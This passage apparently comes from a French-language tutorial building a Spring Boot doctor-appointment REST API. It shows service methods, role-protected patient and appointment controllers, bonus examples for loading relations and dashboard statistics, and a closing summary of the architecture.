            LocalDateTime newFin = updateDto.getDateHeureFin() != null ?
                    updateDto.getDateHeureFin() : appointment.getDateHeureFin();

            // Exclure le rendez-vous actuel de la vérification
            // (on pourrait améliorer le repository pour ça)
        }

        // Mettre à jour
        appointmentMapper.updateEntityFromDto(updateDto, appointment);

        Appointment updatedAppointment = appointmentRepository.save(appointment);

        return appointmentMapper.toDto(updatedAppointment);
    }

    @Override
    @Transactional
    public AppointmentResponseDto changeAppointmentStatus(Long id, StatutAppointment statut) {
        Appointment appointment = appointmentRepository.findById(id)
                .orElseThrow(() -> new ResourceNotFoundException("Rendez-vous non trouvé avec l'ID : " + id));

        appointment.setStatut(statut);

        Appointment updatedAppointment = appointmentRepository.save(appointment);

        return appointmentMapper.toDto(updatedAppointment);
    }

    @Override
    @Transactional
    public void cancelAppointment(Long id) {
        changeAppointmentStatus(id, StatutAppointment.ANNULE);
    }

    @Override
    @Transactional
    public void deleteAppointment(Long id) {
        if (!appointmentRepository.existsById(id)) {
            throw new ResourceNotFoundException("Rendez-vous non trouvé avec l'ID : " + id);
        }

        appointmentRepository.deleteById(id);
    }

    @Override
    @Transactional(readOnly = true)
    public boolean isTimeSlotAvailable(
            Long medecinId,
            LocalDateTime dateHeureDebut,
            LocalDateTime dateHeureFin
    ) {
        return !appointmentRepository.existsConflictingAppointment(
                medecinId,
                dateHeureDebut,
                dateHeureFin
        );
    }
}
```

---

<a name="7-controllers"></a>
## 7️⃣ CONTROLLERS

### Controller/PatientController.java

```java
package DoctorApp.DoctorApp.Controller;

import DoctorApp.DoctorApp.DTO.Patient.PatientRequestDto;
import DoctorApp.DoctorApp.DTO.Patient.PatientResponseDto;
import DoctorApp.DoctorApp.DTO.Patient.PatientSummaryDto;
import DoctorApp.DoctorApp.DTO.Patient.PatientUpdateDto;
import DoctorApp.DoctorApp.Service.IPatientService;
import jakarta.validation.Valid;
import lombok.RequiredArgsConstructor;
import org.springframework.data.domain.Page;
import org.springframework.data.domain.Pageable;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.security.access.prepost.PreAuthorize;
import org.springframework.web.bind.annotation.*;

import java.util.List;
import java.util.Map;

/**
 * Controller pour la gestion des patients
 */
@RestController
@RequestMapping("/api/patients")
@RequiredArgsConstructor
public class PatientController {

    private final IPatientService patientService;

    /**
     * Crée un nouveau patient
     */
    @PostMapping
    @PreAuthorize("hasAnyRole('ADMIN', 'DOCTOR', 'RECEPTIONIST')")
    public ResponseEntity<PatientResponseDto> createPatient(
            @Valid @RequestBody PatientRequestDto request
    ) {
        PatientResponseDto response = patientService.createPatient(request);
        return ResponseEntity.status(HttpStatus.CREATED).body(response);
    }

    /**
     * Récupère un patient par son ID
     */
    @GetMapping("/{id}")
    @PreAuthorize("hasAnyRole('ADMIN', 'DOCTOR', 'RECEPTIONIST')")
    public ResponseEntity<PatientResponseDto> getPatientById(@PathVariable Long id) {
        PatientResponseDto response = patientService.getPatientById(id);
        return ResponseEntity.ok(response);
    }

    /**
     * Récupère tous les patients
     */
    @GetMapping
    @PreAuthorize("hasAnyRole('ADMIN', 'DOCTOR', 'RECEPTIONIST')")
    public ResponseEntity<List<PatientResponseDto>> getAllPatients() {
        List<PatientResponseDto> response = patientService.getAllPatients();
        return ResponseEntity.ok(response);
    }

    /**
     * Récupère tous les patients actifs (version légère)
     */
    @GetMapping("/active")
    @PreAuthorize("hasAnyRole('ADMIN', 'DOCTOR', 'RECEPTIONIST')")
    public ResponseEntity<List<PatientSummaryDto>> getAllActivePatients() {
        List<PatientSummaryDto> response = patientService.getAllActivePatients();
        return ResponseEntity.ok(response);
    }

    /**
     * Récupère les patients avec pagination
     */
    @GetMapping("/page")
    @PreAuthorize("hasAnyRole('ADMIN', 'DOCTOR', 'RECEPTIONIST')")
    public ResponseEntity<Page<PatientResponseDto>> getAllPatients(Pageable pageable) {
        Page<PatientResponseDto> response = patientService.getAllPatients(pageable);
        return ResponseEntity.ok(response);
    }

    /**
     * Recherche des patients
     */
    @GetMapping("/search")
    @PreAuthorize("hasAnyRole('ADMIN', 'DOCTOR', 'RECEPTIONIST')")
    public ResponseEntity<List<PatientSummaryDto>> searchPatients(
            @RequestParam String keyword
    ) {
        List<PatientSummaryDto> response = patientService.searchPatients(keyword);
        return ResponseEntity.ok(response);
    }

    /**
     * Met à jour un patient
     */
    @PutMapping("/{id}")
    @PreAuthorize("hasAnyRole('ADMIN', 'DOCTOR', 'RECEPTIONIST')")
    public ResponseEntity<PatientResponseDto> updatePatient(
            @PathVariable Long id,
            @Valid @RequestBody PatientUpdateDto request
    ) {
        PatientResponseDto response = patientService.updatePatient(id, request);
        return ResponseEntity.ok(response);
    }

    /**
     * Supprime un patient
     */
    @DeleteMapping("/{id}")
    @PreAuthorize("hasRole('ADMIN')")
    public ResponseEntity<Map<String, String>> deletePatient(@PathVariable Long id) {
        patientService.deletePatient(id);
        return ResponseEntity.ok(Map.of("message", "Patient supprimé avec succès"));
    }

    /**
     * Active/désactive un patient
     */
    @PatchMapping("/{id}/status")
    @PreAuthorize("hasRole('ADMIN')")
    public ResponseEntity<PatientResponseDto> togglePatientStatus(
            @PathVariable Long id,
            @RequestBody Map<String, Boolean> request
    ) {
        boolean actif = request.getOrDefault("actif", false);
        PatientResponseDto response = patientService.togglePatientStatus(id, actif);
        return ResponseEntity.ok(response);
    }
}
```

---

### Controller/AppointmentController.java

```java
package DoctorApp.DoctorApp.Controller;

import DoctorApp.DoctorApp.DTO.Appointment.AppointmentRequestDto;
import DoctorApp.DoctorApp.DTO.Appointment.AppointmentResponseDto;
import DoctorApp.DoctorApp.DTO.Appointment.AppointmentSummaryDto;
import DoctorApp.DoctorApp.DTO.Appointment.AppointmentUpdateDto;
import DoctorApp.DoctorApp.Entity.StatutAppointment;
import DoctorApp.DoctorApp.Service.IAppointmentService;
import jakarta.validation.Valid;
import lombok.RequiredArgsConstructor;
import org.springframework.data.domain.Page;
import org.springframework.data.domain.Pageable;
import org.springframework.format.annotation.DateTimeFormat;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.security.access.prepost.PreAuthorize;
import org.springframework.web.bind.annotation.*;

import java.time.LocalDate;
import java.time.LocalDateTime;
import java.util.List;
import java.util.Map;

/**
 * Controller pour la gestion des rendez-vous
 */
@RestController
@RequestMapping("/api/appointments")
@RequiredArgsConstructor
public class AppointmentController {

    private final IAppointmentService appointmentService;

    /**
     * Crée un nouveau rendez-vous
     */
    @PostMapping
    @PreAuthorize("hasAnyRole('ADMIN', 'DOCTOR', 'RECEPTIONIST')")
    public ResponseEntity<AppointmentResponseDto> createAppointment(
            @Valid @RequestBody AppointmentRequestDto request
    ) {
        AppointmentResponseDto response = appointmentService.createAppointment(request);
        return ResponseEntity.status(HttpStatus.CREATED).body(response);
    }

    /**
     * Récupère un rendez-vous par son ID
     */
    @GetMapping("/{id}")
    @PreAuthorize("hasAnyRole('ADMIN', 'DOCTOR', 'RECEPTIONIST', 'PATIENT')")
    public ResponseEntity<AppointmentResponseDto> getAppointmentById(@PathVariable Long id) {
        AppointmentResponseDto response = appointmentService.getAppointmentById(id);
        return ResponseEntity.ok(response);
    }

    /**
     * Récupère tous les rendez-vous avec pagination
     */
    @GetMapping
    @PreAuthorize("hasAnyRole('ADMIN', 'DOCTOR', 'RECEPTIONIST')")
    public ResponseEntity<Page<AppointmentResponseDto>> getAllAppointments(Pageable pageable) {
        Page<AppointmentResponseDto> response = appointmentService.getAllAppointments(pageable);
        return ResponseEntity.ok(response);
    }

    /**
     * Récupère les rendez-vous d'un patient
     */
    @GetMapping("/patient/{patientId}")
    @PreAuthorize("hasAnyRole('ADMIN', 'DOCTOR', 'RECEPTIONIST', 'PATIENT')")
    public ResponseEntity<List<AppointmentSummaryDto>> getAppointmentsByPatient(
            @PathVariable Long patientId
    ) {
        List<AppointmentSummaryDto> response = appointmentService.getAppointmentsByPatient(patientId);
        return ResponseEntity.ok(response);
    }

    /**
     * Récupère les prochains rendez-vous d'un patient
     */
    @GetMapping("/patient/{patientId}/upcoming")
    @PreAuthorize("hasAnyRole('ADMIN', 'DOCTOR', 'RECEPTIONIST', 'PATIENT')")
    public ResponseEntity<List<AppointmentSummaryDto>> getUpcomingAppointmentsByPatient(
            @PathVariable Long patientId
    ) {
        List<AppointmentSummaryDto> response = appointmentService.getUpcomingAppointmentsByPatient(patientId);
        return ResponseEntity.ok(response);
    }

    /**
     * Récupère les rendez-vous d'un médecin
     */
    @GetMapping("/medecin/{medecinId}")
    @PreAuthorize("hasAnyRole('ADMIN', 'DOCTOR', 'RECEPTIONIST')")
    public ResponseEntity<List<AppointmentSummaryDto>> getAppointmentsByMedecin(
            @PathVariable Long medecinId
    ) {
        List<AppointmentSummaryDto> response = appointmentService.getAppointmentsByMedecin(medecinId);
        return ResponseEntity.ok(response);
    }

    /**
     * Récupère les rendez-vous pour une date
     */
    @GetMapping("/date/{date}")
    @PreAuthorize("hasAnyRole('ADMIN', 'DOCTOR', 'RECEPTIONIST')")
    public ResponseEntity<List<AppointmentSummaryDto>> getAppointmentsByDate(
            @PathVariable @DateTimeFormat(iso = DateTimeFormat.ISO.DATE) LocalDate date
    ) {
        List<AppointmentSummaryDto> response = appointmentService.getAppointmentsByDate(date);
        return ResponseEntity.ok(response);
    }

    /**
     * Récupère les rendez-vous par statut
     */
    @GetMapping("/statut/{statut}")
    @PreAuthorize("hasAnyRole('ADMIN', 'DOCTOR', 'RECEPTIONIST')")
    public ResponseEntity<List<AppointmentSummaryDto>> getAppointmentsByStatut(
            @PathVariable StatutAppointment statut
    ) {
        List<AppointmentSummaryDto> response = appointmentService.getAppointmentsByStatut(statut);
        return ResponseEntity.ok(response);
    }

    /**
     * Met à jour un rendez-vous
     */
    @PutMapping("/{id}")
    @PreAuthorize("hasAnyRole('ADMIN', 'DOCTOR', 'RECEPTIONIST')")
    public ResponseEntity<AppointmentResponseDto> updateAppointment(
            @PathVariable Long id,
            @Valid @RequestBody AppointmentUpdateDto request
    ) {
        AppointmentResponseDto response = appointmentService.updateAppointment(id, request);
        return ResponseEntity.ok(response);
    }

    /**
     * Change le statut d'un rendez-vous
     */
    @PatchMapping("/{id}/status")
    @PreAuthorize("hasAnyRole('ADMIN', 'DOCTOR', 'RECEPTIONIST')")
    public ResponseEntity<AppointmentResponseDto> changeAppointmentStatus(
            @PathVariable Long id,
            @RequestBody Map<String, StatutAppointment> request
    ) {
        StatutAppointment statut = request.get("statut");
        AppointmentResponseDto response = appointmentService.changeAppointmentStatus(id, statut);
        return ResponseEntity.ok(response);
    }

    /**
     * Annule un rendez-vous
     */
    @PostMapping("/{id}/cancel")
    @PreAuthorize("hasAnyRole('ADMIN', 'DOCTOR', 'RECEPTIONIST', 'PATIENT')")
    public ResponseEntity<Map<String, String>> cancelAppointment(@PathVariable Long id) {
        appointmentService.cancelAppointment(id);
        return ResponseEntity.ok(Map.of("message", "Rendez-vous annulé avec succès"));
    }

    /**
     * Supprime un rendez-vous
     */
    @DeleteMapping("/{id}")
    @PreAuthorize("hasRole('ADMIN')")
    public ResponseEntity<Map<String, String>> deleteAppointment(@PathVariable Long id) {
        appointmentService.deleteAppointment(id);
        return ResponseEntity.ok(Map.of("message", "Rendez-vous supprimé avec succès"));
    }

    /**
     * Vérifie la disponibilité d'un créneau
     */
    @GetMapping("/check-availability")
    @PreAuthorize("hasAnyRole('ADMIN', 'DOCTOR', 'RECEPTIONIST')")
    public ResponseEntity<Map<String, Boolean>> checkAvailability(
            @RequestParam Long medecinId,
            @RequestParam @DateTimeFormat(iso = DateTimeFormat.ISO.DATE_TIME) LocalDateTime dateHeureDebut,
            @RequestParam @DateTimeFormat(iso = DateTimeFormat.ISO.DATE_TIME) LocalDateTime dateHeureFin
    ) {
        boolean available = appointmentService.isTimeSlotAvailable(medecinId, dateHeureDebut, dateHeureFin);
        return ResponseEntity.ok(Map.of("available", available));
    }
}
```

---

<a name="8-bonus"></a>
## 8️⃣ BONUS : RELATIONS ET CAS COMPLEXES

### Cas 1 : Charger un patient avec ses rendez-vous

```java
// Dans PatientService
@Transactional(readOnly = true)
public PatientWithAppointmentsDto getPatientWithAppointments(Long id) {
    Patient patient = patientRepository.findById(id)
            .orElseThrow(() -> new ResourceNotFoundException("Patient non trouvé"));
    
    PatientWithAppointmentsDto dto = new PatientWithAppointmentsDto();
    BeanUtils.copyProperties(patient, dto);
    
    // Charger les rendez-vous
    List<AppointmentSummaryDto> appointments = patient.getAppointments().stream()
            .map(appointmentMapper::toSummaryDto)
            .collect(Collectors.toList());
    
    dto.setAppointments(appointments);
    
    return dto;
}
```

### Cas 2 : Statistiques du tableau de bord

```java
// Nouveau DTO
@Data
public class DashboardStatsDto {
    private long totalPatients;
    private long totalAppointmentsToday;
    private long totalAppointmentsWeek;
    private long appointmentsEnCours;
    private long appointmentsPlanifies;
    private List<AppointmentSummaryDto> upcomingAppointments;
}

// Dans un nouveau DashboardService
@Service
@RequiredArgsConstructor
public class DashboardService {
    
    private final PatientRepository patientRepository;
    private final AppointmentRepository appointmentRepository;
    private final AppointmentMapper appointmentMapper;
    
    public DashboardStatsDto getStats() {
        DashboardStatsDto stats = new DashboardStatsDto();
        
        stats.setTotalPatients(patientRepository.count());
        
        LocalDate today = LocalDate.now();
        stats.setTotalAppointmentsToday(
            appointmentRepository.findByDate(today.atStartOfDay()).size()
        );
        
        stats.setAppointmentsEnCours(
            appointmentRepository.findByStatut(StatutAppointment.EN_COURS).size()
        );
        
        // ... autres stats
        
        return stats;
    }
}
```

---

## 📝 RÉSUMÉ FINAL

### Ce que tu as maintenant :

✅ **Architecture en couches** :
- Controllers (API REST)
- Services (Interfaces + Implémentations)
- Repositories (Accès données)
- Mappers (Conversion Entity ↔ DTO)

✅ **DTOs bien structurés** :
- RequestDto (création)
- ResponseDto (lecture complète)
- UpdateDto (mise à jour partielle)
- SummaryDto (listes légères)

✅ **Mapping professionnel** :
- BeanUtils.copyProperties() pour les champs simples
- Mapping manuel pour les relations complexes

✅ **Gestion d'erreurs** :
- Exceptions personnalisées
- GlobalExceptionHandler
- Messages clairs

✅ **Sécurité** :
- @PreAuthorize sur chaque endpoint
- Validation @Valid
- @Transactional

✅ **Code propre** :
- Principes SOLID respectés
- Javadoc
- Nommage clair

---

**Besoin d'aide pour d'autres entités (Prescription, etc.) ou des fonctionnalités avancées ? 😊**